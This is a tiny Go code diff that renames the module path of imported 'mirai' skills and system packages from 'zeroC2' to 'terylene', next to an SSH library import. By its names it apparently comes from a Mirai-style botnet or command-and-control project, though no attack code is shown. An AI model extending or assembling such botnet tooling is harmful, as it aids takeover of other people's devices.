@@ -5,8 +5,8 @@ import (
 	"os"
 	"sync"
 	"time"
-	"zeroC2/mirai/components/skills"
-	"zeroC2/mirai/components/system"
+	"terylene/mirai/components/skills"
+	"terylene/mirai/components/system"
 
 	"golang.org/x/crypto/ssh"
 )
